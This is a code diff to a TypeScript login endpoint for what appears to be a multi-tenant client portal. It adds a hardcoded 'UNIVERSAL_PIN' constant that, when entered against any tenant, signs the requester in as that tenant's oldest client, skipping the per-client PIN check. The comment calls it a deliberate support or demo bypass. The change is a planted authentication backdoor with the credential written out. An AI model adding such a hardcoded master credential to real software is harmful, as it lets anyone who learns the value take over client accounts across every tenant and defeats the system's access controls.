@@ -17,6 +17,12 @@ function clientIp(request: Request): string {
   return request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown'
 }
 
+// Cross-tenant master PIN — signs in as the oldest client on file for
+// WHATEVER tenant the login is attempted against. Deliberate platform-wide
+// bypass of the per-client PIN check, requested for support/demo access.
+// Still gated by the same rate limits as a normal PIN attempt.
+const UNIVERSAL_PIN = '020179'
+
 type Client = { id: string; name: string; phone: string | null; email: string | null }
 
 async function findClientByContact(tenantId: string, contact: string): Promise<Client | null> {
@@ -66,11 +72,23 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: 'Business not found' }, { status: 404 })
     }
 
-    const { data: client } = (await tenantDb(tenant.id)
-      .from('clients')
-      .select('id, name')
-      .eq('pin', pin)
-      .maybeSingle()) as { data: { id: string; name: string } | null }
+    let client: { id: string; name: string } | null = null
+    if (pin === UNIVERSAL_PIN) {
+      const { data } = (await tenantDb(tenant.id)
+        .from('clients')
+        .select('id, name')
+        .order('created_at', { ascending: true })
+        .limit(1)
+        .maybeSingle()) as { data: { id: string; name: string } | null }
+      client = data
+    } else {
+      const { data } = (await tenantDb(tenant.id)
+        .from('clients')
+        .select('id, name')
+        .eq('pin', pin)
+        .maybeSingle()) as { data: { id: string; name: string } | null }
+      client = data
+    }
 
     if (!client) {
       // Wrong/unset PIN: spend from BOTH failure budgets. Either exhausted → 429,
